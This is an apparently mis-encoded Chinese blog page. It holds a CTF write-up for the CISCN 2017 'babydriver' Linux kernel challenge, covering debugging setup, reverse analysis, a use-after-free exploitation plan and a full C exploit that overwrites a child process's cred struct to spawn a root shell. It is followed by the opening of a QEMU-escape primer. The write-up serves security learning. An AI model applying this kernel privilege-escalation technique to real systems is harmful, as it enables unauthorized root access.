<p>ä¸‹é¢çš„å‘½ä»¤å¯¼å…¥ç¬¦å·è¡¨ï¼Œè¿™ä¸ª <code>ko</code> æ–‡ä»¶æ˜¯åˆšåˆšè§£å‹ <code>rootfs.cpio</code> å¾—åˆ°çš„ï¼Œåé¢è¿™ä¸ª <code>0xffffffffc0000000</code> éœ€è¦åœ¨å¯åŠ¨å†…æ ¸åï¼Œè¾“å…¥ <code>lsmod</code> æŸ¥çœ‹é©±åŠ¨çš„åŸºåœ°å€ä»è€Œå¾—åˆ°ã€‚</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">add-symbol-file /home/zikh/Desktop/babydriver/core/lib/modules/4.4.72/babydriver.ko 0xffffffffc0000000</span><br></pre></td></tr></table></figure>



<p>æœ€åç”¨ä¸‹é¢çš„å‘½ä»¤è¿æ¥ï¼Œè°ƒè¯•ç¨‹åº</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">target remote localhost:1234</span><br></pre></td></tr></table></figure>

<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261609913.png" alt="image-20230326160909064"></p>
<p>è®¾ç½®æ–­ç‚¹éœ€è¦ç”¨é©±åŠ¨çš„åŸºåœ°å€åŠ ä¸Š <code>ida</code> ä¸­çš„åç§»çš„ä½ç½®æ‰“æ–­ç‚¹å³å¯ï¼Œè¿™ä¸ªåŸºåœ°å€ä»…ä»…æ˜¯å’Œ <code>text</code> æ®µçš„åœ°å€ç›¸åŒï¼Œå‡è®¾ä½ ç°åœ¨æƒ³æŸ¥çœ‹ <code>bss</code> æ®µä¸Šçš„æŸä¸ªå˜é‡ï¼Œé‚£ä¹ˆéœ€è¦è·å–åˆ° <code>bss</code> æ®µçš„åŸºåœ°å€ä»¥åŠå˜é‡åœ¨ <code>bss</code> æ®µä¸Šçš„åç§»ã€‚</p>
<p>å‡è®¾è¦æŸ¥çœ‹ <code>0xd90</code> è¿™ä¸ªåœ°å€è£…è½½åˆ°å†…å­˜ä¸­çš„å®é™…åœ°å€ã€‚é¦–å…ˆè·å–å®ƒåœ¨ <code>bss</code> æ®µä¸Šçš„åç§»ï¼Œå‘ç° <code>bss</code> æ®µåŸºåœ°å€ä¸º <code>0xd00</code> å› æ­¤è¿™ä¸ªåœ°å€åœ¨ <code>bss</code> æ®µä¸Šåç§»ä¸º <code>0x90</code> </p>
<img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270841264.png" alt="image-20230327084110128" style="zoom: 50%;" />



<p>è·å– <code>bss</code> æ®µçš„åŸºåœ°å€ ï¼ˆå¦‚ä¸‹ï¼‰</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270843604.png" alt="image-20230327084300554"></p>
<p>å› æ­¤ <code>babydevice_t</code> ç»“æ„ä½“åœ°å€æ˜¯ <code>0xffffffffc00024d0</code> ï¼ŒéªŒè¯å¦‚ä¸‹</p>
<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303270853716.png" alt="image-20230327085333674"></p>
<h5 id="å†…æ ¸ææƒ"><a href="#å†…æ ¸ææƒ" class="headerlink" title="å†…æ ¸ææƒ"></a>å†…æ ¸ææƒ</h5><p>å¦‚æœæ”»å‡»è€…èƒ½å¤Ÿä¿®æ”¹æŸä¸ªè¿›ç¨‹ä¸­çš„ <code>cred</code> ç»“æ„ä½“ä¸­çš„ <code>gid</code> å’Œ <code>uid</code> <code>euid</code>ç­‰å­—æ®µä¸º <code>0</code>ï¼Œä¹Ÿå°±æ˜¯èƒ½æ§åˆ¶ <code>cred</code> ç»“æ„ä½“çš„è¯ï¼Œé‚£ä¹ˆæ”»å‡»è€…å°±è·å¾—äº† <code>root</code> æƒé™ï¼Œå¦‚æœå†å¼€å¯ä¸€ä¸ª <code>shell</code> çš„è¯ï¼Œæ‰§è¡Œçš„ä»»ä½•å‘½ä»¤ä¹Ÿéƒ½æ˜¯æ‹¥æœ‰ <code>root</code> æƒé™</p>
<h5 id="é¢˜ç›®é“¾æ¥"><a href="#é¢˜ç›®é“¾æ¥" class="headerlink" title="é¢˜ç›®é“¾æ¥"></a>é¢˜ç›®é“¾æ¥</h5><p><a target="_blank" rel="noopener" href="https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar">https://github.com/cc-sir/ctf-challenge/blob/master/2017CISCN%20babydriver/babydriver.tar</a></p>
<p>è§£å‹æ–‡ä»¶</p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">tar -xvf babydriver.tar</span><br></pre></td></tr></table></figure>



<p><code>boot.sh</code> æ–‡ä»¶</p>
<p>å› ä¸ºæˆ‘çš„è™šæ‹Ÿæœºä¸æ”¯æŒ <code>kvm</code> ï¼Œæ‰€ä»¥æŠŠåŸæœ¬ <code>-enable-kvm</code> è¿™æ®µä»£ç åˆ äº†ï¼Œä¸ºäº†æ–¹ä¾¿ä¹‹åä½¿ç”¨ <code>gdb</code> è¿›è¡Œè°ƒè¯•ï¼ŒåŠ ä¸Šäº† <code>-gdb tcp::1234</code> è¿™æ®µä»£ç </p>
<figure class="highlight sh"><table><tr><td class="code"><pre><span class="line"><span class="meta">#!/bin/bash</span></span><br><span class="line">qemu-system-x86_64 -initrd rootfs.cpio -kernel bzImage -append <span class="string">&#x27;console=ttyS0 root=/dev/ram oops=panic panic=1&#x27;</span>  -monitor /dev/null -m 64M --nographic  -smp cores=1,threads=1 -cpu kvm64,+smep -gdb tcp::1234</span><br></pre></td></tr></table></figure>

<p>ç„¶åè¿è¡Œ <code>boot.sh</code> å¯åŠ¨å³å¯ã€‚</p>
<h5 id="é€†å‘åˆ†æ"><a href="#é€†å‘åˆ†æ" class="headerlink" title="é€†å‘åˆ†æ"></a>é€†å‘åˆ†æ</h5><h6 id="babyopen"><a href="#babyopen" class="headerlink" title="babyopen"></a>babyopen</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303261513281.png" alt="image-20230326151320208"></p>
<p>ç”³è¯·äº† <code>0x40</code> çš„å †ç©ºé—´ï¼Œå¹¶è¿”å›ç”³è¯·çš„å†…å­˜é¦–åœ°å€è®°å½•åœ¨ <code>babydevice_t</code> ç»“æ„ä½“çš„ <code>device_buf</code> å­—æ®µ</p>
<p>å°† <code>0x40</code> èµ‹å€¼ä¸º <code>babydevice_t</code> ç»“æ„ä½“çš„ <code>device_buf</code> å­—æ®µã€‚éœ€è¦æ³¨æ„çš„æ˜¯ <code>babydevice_t</code> ç»“æ„ä½“ä½äº <code>bss</code> æ®µä¸Šï¼Œè¿™ä¸ªå…¨å±€å˜é‡å°±ä¼šå­˜åœ¨è¢«è¦†ç›–çš„å¯èƒ½ï¼Œä¹Ÿå°±æ˜¯è¯´æˆ‘è¿ç»­ <code>open</code> ä¸¤æ¬¡ï¼Œé‚£ä¹ˆç¬¬äºŒæ¬¡ç”³è¯·å‡ºæ¥çš„å†…å­˜å—åœ°å€åˆ™ä¼šè¦†ç›–ç¬¬ä¸€æ¬¡ç”³è¯·çš„å†…å­˜å—åœ°å€ã€‚</p>
<h6 id="babyioctl"><a href="#babyioctl" class="headerlink" title="babyioctl"></a>babyioctl</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262003083.png" alt="image-20230326200309961" style="zoom: 80%;" />

<p>è¯¥å‡½æ•°å®šä¹‰äº†ä¸€ä¸ª <code>0x10001</code> çš„å‘½ä»¤ï¼Œå…ˆå°† <code>babydevice_t</code> ç»“æ„ä½“ä¸­çš„ <code>device_buf</code> ç»™é‡Šæ”¾æ‰ï¼Œç„¶åé‡æ–°ç”³è¯·äº†ä¸€å—å†…å­˜ï¼Œå› ä¸º <code>v3</code> æ˜¯ <code>rdx</code> å¯„å­˜å™¨æ‰€èµ‹å€¼çš„ï¼Œä¹Ÿå°±æ˜¯ <code>babyioctl</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°ï¼Œè€Œ <code>v3</code> åˆç»™äº† <code>v4</code> ï¼Œè¿™ä¸ªå†…å­˜å¤§å°æ˜¯æˆ‘ä»¬å¯æ§çš„ã€‚</p>
<h6 id="babyread"><a href="#babyread" class="headerlink" title="babyread"></a>babyread</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262016891.png" alt="image-20230326201609836"></p>
<p>è¯¥å‡½æ•°æ˜¾ç¤ºæ£€æŸ¥äº† <code>device_buf</code> æ˜¯å¦ä¸ºç©ºï¼Œå¦‚æœä¸ºç©ºçš„è¯è¿”å› <code>-1</code> ï¼Œå¦‚æœ <code>device_buf_len</code> å¤§äº <code>write</code> å‡½æ•°çš„ç¬¬ä¸‰ä¸ªå‚æ•°åˆ™å°† <code>device_buf</code> ä¸­çš„æ•°æ® <code>copy</code> åˆ°ç”¨æˆ·åŒº <code>buffer</code> ç©ºé—´ä¸­</p>
<p>è¿™é‡Œ <code>ida</code> ç”Ÿæˆçš„ä¼ªä»£ç æ˜¯æœ‰ç‚¹é—®é¢˜çš„ï¼Œæ­£å¸¸æƒ…å†µæ˜¯ <code>copy_to_user(buffer, babydev_struct.device_buf, v4);</code></p>
<h6 id="babywrite"><a href="#babywrite" class="headerlink" title="babywrite"></a>babywrite</h6><p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262041836.png" alt="image-20230326204108774"></p>
<p>è¿™ä¸ªå‡½æ•°å’Œ <code>babywrite</code> æ˜¯ç›¸åçš„ï¼Œå°†æ•°æ®ä»ç”¨æˆ·åŒºçš„ <code>buffer</code> å¤åˆ¶åˆ°å†…æ ¸ä¸­çš„ <code>device_buf</code> ã€‚</p>
<h6 id="babyrelease"><a href="#babyrelease" class="headerlink" title="babyrelease"></a>babyrelease</h6><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262101441.png" alt="image-20230326210113392" style="zoom: 80%;" />

<p>è¯¥å‡½æ•°å¯ä»¥å°† <code>device_buf</code> è¿™ä¸ªå †å—ç»™é‡Šæ”¾æ‰ï¼Œä½†æ˜¯é‡Šæ”¾å†…å­˜åï¼Œæœªå°†æŒ‡é’ˆç½®ç©ºï¼Œäº§ç”Ÿäº† <code>UAF</code> æ¼æ´ã€‚</p>
<h4 id="åˆ©ç”¨æ€è·¯"><a href="#åˆ©ç”¨æ€è·¯" class="headerlink" title="åˆ©ç”¨æ€è·¯"></a>åˆ©ç”¨æ€è·¯</h4><p>è¿ç»­ <code>open</code> ä¸¤æ¬¡ï¼Œåˆ†é…å‡º <code>fd1</code> å’Œ <code>fd2</code> ï¼Œæ­¤æ—¶ <code>fd2</code> å°† <code>fd1</code> çš„å †å—åœ°å€è¦†ç›–æ‰äº†ã€‚å†ä½¿ç”¨ <code>ioctl</code> å‡½æ•°å»æ‰§è¡Œé‚£ä¸ª <code>0x10001</code> çš„æŒ‡ä»¤ï¼Œå°† <code>fd1</code> é‡Šæ”¾æ‰ ï¼ˆå…¶å®é‡Šæ”¾çš„æ˜¯ <code>fd2</code> ï¼‰ï¼Œå†ç”³è¯·ä¸€ä¸ª <code>0xa8</code> çš„å †å—å‡ºæ¥ï¼ˆç”¨äºä¼ªé€  <code>cred</code> ç»“æ„ä½“ ï¼‰ï¼Œæ¥ç€å†ç”¨ <code>release</code> ï¼ˆä¹Ÿå°±æ˜¯ <code>close</code> ï¼‰ å‡½æ•°å°† <code>fd1</code> é‡Šæ”¾æ‰ï¼ˆæ­¤æ—¶é‡Šæ”¾çš„æ˜¯åˆšåˆšç”³è¯·å‡ºæ¥ <code>0xa8 </code>çš„é‚£ä¸ªå †å—ï¼‰</p>
<p>è°ƒç”¨ <code>fork</code> å‡½æ•°ï¼Œåˆ›å»ºä¸€ä¸ªå­è¿›ç¨‹å‡ºæ¥ï¼Œå¹¶è®©çˆ¶è¿›ç¨‹ <code>wait</code>ã€‚å­è¿›ç¨‹äº§ç”Ÿæ—¶ï¼Œå°±éœ€è¦ç”³è¯·ä¸€ä¸ª <code>0xa8</code> çš„å †å—ç”¨æ¥å½“åš <code>cred</code> ç»“æ„ä½“ï¼Œè¿™æ—¶å°±ä¼šç”³è¯·å‡ºæ¥åˆšåˆšçš„æˆ‘ä»¬é‡Šæ”¾æ‰çš„å †å—ã€‚å› ä¸ºæœ€å <code>release</code> æ˜¯å¯¹ <code>fd1</code> æ“ä½œçš„ï¼Œæ­¤æ—¶ <code>fd2</code> æ˜¯ä¾ç„¶å¯ä»¥è¢«å†™å…¥æ•°æ®çš„ï¼Œå‘ <code>fd2</code> ä¸­å†™å…¥æ•°æ®å°±ç­‰åŒäºå‘å­è¿›ç¨‹åˆšåˆšç”³è¯· <code>cred</code> ç»“æ„ä½“ä¸­å†™å…¥æ•°æ®ã€‚æ­¤æ—¶çˆ¶è¿›ç¨‹ä¸­ <code>device_buf</code> è®°å½•çš„å°±æ˜¯åˆšåˆšå­è¿›ç¨‹ç”³è¯·å †å—çš„åœ°å€ã€‚</p>
<p>å°†å…¶ <code>cred</code> ç»“æ„ä½“å‰ <code>0x28</code> ä¸ªå­—èŠ‚è¦†ç›–æˆ <code>\x00</code> æ‰§è¡Œ <code>system(&quot;/bin/sh&quot;)</code> å³å¯å¼€å¯ä¸€ä¸ª <code>root</code> æƒé™ä¸‹çš„ <code>shell</code> ï¼Œä¹Ÿå°±å®Œæˆäº†æ‰€è°“çš„å†…æ ¸ææƒã€‚</p>
<p>ä¸Šè¿°æ€è·¯çš„é‡ç‚¹åœ¨äºï¼Œ<code>release</code> æ“ä½œå¯¹ä¸€ä¸ªæ–‡ä»¶ä½¿ç”¨åï¼Œå°±æ— æ³•å†ç”¨ <code>write</code> ç­‰å‡½æ•°è¿›è¡Œè¯¥æ–‡ä»¶çš„æ“ä½œäº†ã€‚ä½† <code>fd1</code> å’Œ <code>fd2</code> å…¶å®éƒ½åŒæ—¶æŒ‡å‘äº†<code>device_buf</code> ï¼ˆæ— è®º <code>device_buf</code> æ˜¯å“ªä¸ªå †å—åœ°å€ï¼‰ã€‚å› æ­¤ç”¨ <code>release</code> å‡½æ•°é‡Šæ”¾ <code>fd1</code> å°†ç”³è¯·çš„ <code>0xa8</code> å †å—ç»™ <code>free</code> æ‰ï¼Œé€šè¿‡ <code>write</code> å‡½æ•°å¯¹ <code>fd2</code> æ“ä½œä¾ç„¶å¯ä»¥å†™å…¥æ•°æ®ã€‚</p>
<h4 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h4><figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;stdio.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span><span class="string">&lt;fcntl.h&gt;</span></span></span><br><span class="line"><span class="meta">#<span class="keyword">include</span> <span class="string">&lt;unistd.h&gt;</span></span></span><br><span class="line"><span class="type">int</span> <span class="title function_">main</span><span class="params">()</span></span><br><span class="line">&#123;</span><br><span class="line">	<span class="type">int</span> fd1=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="type">int</span> fd2=open(<span class="string">&quot;/dev/babydev&quot;</span>,O_RDWR);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fd1 ---&gt; %d\n&quot;</span>,fd1);</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;fd2 ---&gt; %d\n&quot;</span>,fd2);</span><br><span class="line">	ioctl(fd1,<span class="number">0x10001</span>,<span class="number">0xa8</span>);</span><br><span class="line">	close(fd1);</span><br><span class="line">	<span class="type">int</span> id;</span><br><span class="line">	<span class="type">char</span> cred[<span class="number">0xa8</span>]=&#123;<span class="number">0</span>&#125;;</span><br><span class="line">	id=fork();</span><br><span class="line">	<span class="keyword">if</span>(id&lt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		<span class="built_in">printf</span>(<span class="string">&quot;fork error!\n&quot;</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(id&gt;<span class="number">0</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		wait(<span class="literal">NULL</span>);</span><br><span class="line">	&#125;</span><br><span class="line">	<span class="keyword">if</span>(id==<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">		write(fd2,cred,<span class="number">0x28</span>);</span><br><span class="line">		<span class="keyword">if</span>(getuid()==<span class="number">0</span>)</span><br><span class="line">		&#123;</span><br><span class="line">			<span class="built_in">printf</span>(<span class="string">&quot;root user!\n&quot;</span>);</span><br><span class="line">			system(<span class="string">&quot;/bin/sh&quot;</span>);</span><br><span class="line">			<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">		&#125;</span><br><span class="line">        &#125;</span><br><span class="line">	<span class="built_in">printf</span>(<span class="string">&quot;emmmm!\n&quot;</span>);</span><br><span class="line">	close(fd2);</span><br><span class="line">	<span class="keyword">return</span> <span class="number">0</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>



<p><img src="https://blog-1311372141.cos.ap-nanjing.myqcloud.com/images/202303262347791.png" alt="image-20230326234748211"></p>
<h3 id="å‚è€ƒæ–‡ç« "><a href="#å‚è€ƒæ–‡ç« " class="headerlink" title="å‚è€ƒæ–‡ç« "></a>å‚è€ƒæ–‡ç« </h3><p><a target="_blank" rel="noopener" href="https://ctf-wiki.org/pwn/linux/kernel-mode/exploitation/uaf/">kernel UAF - CTF Wiki (ctf-wiki.org)</a></p>
<p><a target="_blank" rel="noopener" href="https://blog.csdn.net/qq_40827990/article/details/97272034?spm=1001.2014.3001.5502">(47æ¡æ¶ˆæ¯) kernel pwn â€“ UAF_é’sirçš„åšå®¢-CSDNåšå®¢</a></p>

      
    </div>

    
    
    

    <footer class="post-footer">
        <div class="post-eof"></div>
      
    </footer>
  </article>
</div>




    


<div class="post-block">
  
  

  <article itemscope itemtype="http://schema.org/Article" class="post-content" lang="">
    <link itemprop="mainEntityOfPage" href="https://zikh26.github.io/posts/fabe43ff.html">

    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
      <meta itemprop="image" content="/images/avatar.gif">
      <meta itemprop="name" content="ZIKH26">
    </span>

    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
      <meta itemprop="name" content="ZIKH26's Blog">
      <meta itemprop="description" content="ä¸‡å¤å‡¡é—´ä¸€è¿‡å®¢ï¼Œä¹å¤©ä¹‹ä¸Šç¬¬ä¸€ä»™">
    </span>

    <span hidden itemprop="post" itemscope itemtype="http://schema.org/CreativeWork">
      <meta itemprop="name" content="undefined | ZIKH26's Blog">
      <meta itemprop="description" content="">
    </span>
      <header class="post-header">
        <h2 class="post-title" itemprop="name headline">
          <a href="/posts/fabe43ff.html" class="post-title-link" itemprop="url">å…³äºqemué€ƒé€¸çš„å­¦ä¹ æ€»ç»“</a>
        </h2>

        <div class="post-meta-container">
          <div class="post-meta">
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-calendar"></i>
      </span>
      <span class="post-meta-item-text">å‘è¡¨äº</span>
      

      <time title="åˆ›å»ºæ—¶é—´ï¼š2023-05-15 07:36:47 / ä¿®æ”¹æ—¶é—´ï¼š08:58:52" itemprop="dateCreated datePublished" datetime="2023-05-15T07:36:47+08:00">2023-05-15</time>
    </span>
    <span class="post-meta-item">
      <span class="post-meta-item-icon">
        <i class="far fa-folder"></i>
      </span>
      <span class="post-meta-item-text">åˆ†ç±»äº</span>
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/" itemprop="url" rel="index"><span itemprop="name">å­¦ä¹ æ€»ç»“</span></a>
        </span>
          ï¼Œ
        <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
          <a href="/categories/%E5%AD%A6%E4%B9%A0%E6%80%BB%E7%BB%93/%E8%B5%9B%E9%A2%98WP/" itemprop="url" rel="index"><span itemprop="name">èµ›é¢˜WP</span></a>
        </span>
    </span>

  
</div>

        </div>
      </header>

    
    
    
    <div class="post-body" itemprop="articleBody">
          <p>å‰ä¸€æ®µ <code>VNCTF 2023</code> æ­£å¥½æœ‰ä¸€é“éå¸¸å…¥é—¨ <code>qemu</code> é€ƒé€¸çš„é¢˜ç›®ï¼Œæ­£å¥½ä»¥æ­¤ä¸ºå¥‘æœºè¿›è¡Œ <code>qemu</code> é€ƒé€¸çš„å…¥é—¨å­¦ä¹ ï¼Œåœ¨è¿™éƒ¨åˆ†çš„å­¦ä¹ ä¸­ï¼Œè¦æ„Ÿè°¢ <strong>winmt</strong> å’Œ <strong>roderick</strong> å¸ˆå‚…è§£ç­”æˆ‘çš„ä¸€äº›å›°æƒ‘ã€‚</p>
<h2 id="å‰ç½®çŸ¥è¯†"><a href="#å‰ç½®çŸ¥è¯†" class="headerlink" title="å‰ç½®çŸ¥è¯†"></a>å‰ç½®çŸ¥è¯†</h2><h3 id="QEMUä¸é€ƒé€¸"><a href="#QEMUä¸é€ƒé€¸" class="headerlink" title="QEMUä¸é€ƒé€¸"></a>QEMUä¸é€ƒé€¸</h3><p><code>QEMU</code> æ˜¯çº¯è½¯ä»¶å®ç°çš„è™šæ‹ŸåŒ–<strong>æ¨¡æ‹Ÿå™¨</strong>ï¼Œå¯ä»¥æ¨¡æ‹Ÿå¤šç§ä¸åŒçš„è®¡ç®—æœºç³»ç»Ÿå’Œç¡¬ä»¶è®¾å¤‡ã€‚è™½ç„¶ <code>QEMU</code> å¯ä»¥æ¨¡æ‹Ÿå‡ºç¡¬ä»¶æˆ–è™šæ‹Ÿç¯å¢ƒï¼Œä½†å®ƒæœ¬è´¨ä¸Šåªæ˜¯ä¸€ä¸ªç¨‹åºï¼Œæ‰€è°“ <code>qemu</code> é€ƒé€¸æ˜¯æŒ‡æ”»å‡»è€…åˆ©ç”¨ <code>QEMU</code> å®ç°çš„æœ‰æ¼æ´çš„ <code>PCI</code> è®¾å¤‡æ¥è·å–ä¸»æœºçš„æƒé™ã€‚ä»è™šæ‹Ÿæœºä¸­ â€œé€ƒå‡ºæ¥â€ï¼Œå…¶åˆ©ç”¨æ–¹å¼å’Œå¹³å¸¸ç”¨æˆ·ç¨‹åºæ‰§è¡Œ <code>system</code> å‡½æ•°æ˜¯ä¸€æ ·çš„ï¼Œåªä¸è¿‡å¹³å¸¸ <code>PWN</code> é¢˜çš„è§¦å‘æ–¹å¼æ˜¯é€šè¿‡ç”¨æˆ·çš„è¾“å…¥è¿›è¡Œè§¦å‘ï¼Œè€Œ <code>QEMU</code> è™šæ‹Ÿæœºçš„è®¾å¤‡æ¼æ´é€šè¿‡è¿è¡Œåœ¨è™šæ‹Ÿæœºä¸Šçš„ç”¨æˆ·ç¨‹åºå¯¹è®¾å¤‡çš„ <code>IO</code> äº¤äº’æ¥é—´æ¥è§¦å‘ã€‚</p>
<h3 id="PCIè®¾å¤‡"><a href="#PCIè®¾å¤‡" class="headerlink" title="PCIè®¾å¤‡"></a>PCIè®¾å¤‡</h3><p><code>PCI</code> è®¾å¤‡æ˜¯ç¬¦åˆ <code>PCI</code> æ€»çº¿æ ‡å‡†çš„è®¾å¤‡ï¼Œè®¾å¤‡å¯ä»¥ç”³è¯·ä¸¤ç±»åœ°å€ç©ºé—´ï¼Œåˆ†åˆ«æ˜¯ <code>memory space</code> å’Œ <code>I/O space</code> ï¼Œ<code>CPU</code> é€šè¿‡ <code>memory space</code> è®¿é—®è®¾å¤‡ <code>I/O</code> çš„æ–¹å¼ç§°ä¸º <code>memory mapped I/O</code>ï¼Œä¹Ÿå°±æ˜¯ <code>MMIO</code>ã€‚é€šè¿‡ <code>I/O space</code> è®¿é—®è®¾å¤‡ <code>I/O</code> çš„æ–¹å¼ç§°ä¸º <code>port mapped I/O</code>ï¼Œå³ <code>PMIO</code>ã€‚</p>
<h3 id="MMIO"><a href="#MMIO" class="headerlink" title="MMIO"></a>MMIO</h3><p><code>MMIO</code> æ˜¯æŒ‡å°† <code>I/O</code> è®¾å¤‡çš„å¯„å­˜å™¨æ˜ å°„åˆ°ç³»ç»Ÿå†…å­˜åœ°å€ç©ºé—´ä¸­çš„ä¸€ç§æœºåˆ¶ ï¼Œå®ƒä½¿ç”¨ç›¸åŒçš„åœ°å€æ€»çº¿æ¥å¤„ç†å†…å­˜å’Œ <code>I/O</code> è®¾å¤‡ï¼Œ<code>I/O</code> è®¾å¤‡çš„å†…å­˜å’Œå¯„å­˜å™¨è¢«æ˜ å°„åˆ°ä¸ä¹‹ç›¸å…³è”çš„åœ°å€ã€‚å½“ <code>CPU</code> è®¿é—®æŸä¸ªå†…å­˜åœ°å€æ—¶ï¼Œå®ƒå¯èƒ½æ˜¯ç‰©ç†å†…å­˜ï¼Œä¹Ÿå¯ä»¥æ˜¯æŸä¸ª <code>I/O</code> è®¾å¤‡çš„å†…å­˜ï¼Œç”¨äºè®¿é—®å†…å­˜çš„  <code>CPU</code> æŒ‡ä»¤ä¹Ÿå¯æ¥è®¿é—® <code>I/O</code> è®¾å¤‡ã€‚æ¯ä¸ª <code>I/O</code> è®¾å¤‡ç›‘è§† <code>CPU</code> çš„åœ°å€æ€»çº¿ï¼Œä¸€æ—¦ <code>CPU</code> è®¿é—®åˆ†é…ç»™å®ƒçš„åœ°å€ï¼Œå®ƒå°±åšå‡ºå“åº”ï¼Œå°†æ•°æ®æ€»çº¿è¿æ¥åˆ°éœ€è¦è®¿é—®çš„è®¾å¤‡ç¡¬ä»¶å¯„å­˜å™¨ã€‚ä¸ºäº†å®¹çº³<code> I/O</code>è®¾å¤‡ï¼Œ<code>CPU</code> å¿…é¡»é¢„ç•™ç»™<code>I/O</code> ä¸€ä¸ªåœ°å€åŒºåŸŸï¼Œè¯¥åœ°å€åŒºåŸŸä¸èƒ½ç»™ç‰©ç†å†…å­˜ä½¿ç”¨ã€‚</p>
<p>å¦‚æœèƒ½ç†è§£ä¸Šé¢æ‰€è¯´çš„ <code>MMIO</code> ï¼Œé‚£ä¹ˆå°±ä¸å¾—ä¸æ <code>xxx_mmio_read</code> å’Œ <code>xxx_mmio_write</code> è¿™ä¸¤ä¸ªå‡½æ•°äº†ï¼ˆ <code>xxx</code> æ˜¯è®¾å¤‡åï¼‰ï¼Œ<code>xxx_mmio_read</code> å‡½æ•°ç”¨äºä»è™šæ‹Ÿè®¾å¤‡çš„ <code>MMIO</code> åœ°å€ç©ºé—´ä¸­è¯»å–æ•°æ®ï¼Œè€Œ <code>xxx_mmio_write</code> å‡½æ•°åˆ™æ˜¯å‘æŒ‡å®šçš„ <code>MMIO</code> åœ°å€ç©ºé—´ä¸­å†™å…¥æ•°æ®ã€‚<code>qemu</code> ä¼šç›‘å¬è¯»å†™æ“ä½œï¼Œå½“ç›‘å¬åˆ°è¯»å†™åï¼Œå°±ä¼šè°ƒç”¨è¿™ä¸¤ä¸ªå‡½æ•°ã€‚</p>
<h3 id="PMIO"><a href="#PMIO" class="headerlink" title="PMIO"></a>PMIO</h3><p><code>PMIO</code> å…è®¸CPUé€šè¿‡ä¸“ç”¨çš„æŒ‡ä»¤è¿›è¡Œè¾“å…¥ è¾“å‡ºæ“ä½œï¼Œè€Œä¸æ˜¯å°†I&#x2F;Oè®¾å¤‡è§†ä¸ºå†…å­˜ä¸­çš„ç‰¹æ®Šä½ç½®,åœ¨ <code>PMIO</code> ä¸­ï¼Œå†…å­˜å’Œ <code>I/O</code> è®¾å¤‡æœ‰å„è‡ªçš„åœ°å€ç©ºé—´ã€‚ ç«¯å£æ˜ å°„ <code>I/O</code> é€šå¸¸ä½¿ç”¨ä¸€ç§ç‰¹æ®Šçš„ <code>CPU</code> æŒ‡ä»¤ï¼Œä¸“é—¨æ‰§è¡Œ <code>I/O</code> æ“ä½œã€‚åœ¨ <code>Intel</code> çš„å¾®å¤„ç†å™¨ä¸­ï¼Œä½¿ç”¨çš„æŒ‡ä»¤æ˜¯ <code>IN</code> å’Œ <code>OUT</code>ã€‚è¿™äº›æŒ‡ä»¤å¯ä»¥è¯»&#x2F;å†™ 1,2,4 ä¸ªå­—èŠ‚ï¼ˆä¾‹å¦‚ï¼šoutb, outw, outlï¼‰åˆ° <code>IO</code> è®¾å¤‡ä¸Šã€‚<code>I/O</code> è®¾å¤‡æœ‰ä¸€ä¸ªä¸å†…å­˜ä¸åŒçš„åœ°å€ç©ºé—´ï¼Œä¸ºäº†å®ç°åœ°å€ç©ºé—´çš„éš”ç¦»ï¼Œè¦ä¹ˆåœ¨ <code>CPU</code> ç‰©ç†æ¥å£ä¸Šå¢åŠ ä¸€ä¸ª <code>I/O</code> å¼•è„šï¼Œè¦ä¹ˆå¢åŠ ä¸€æ¡ä¸“ç”¨çš„ <code>I/O</code> æ€»çº¿ã€‚</p>
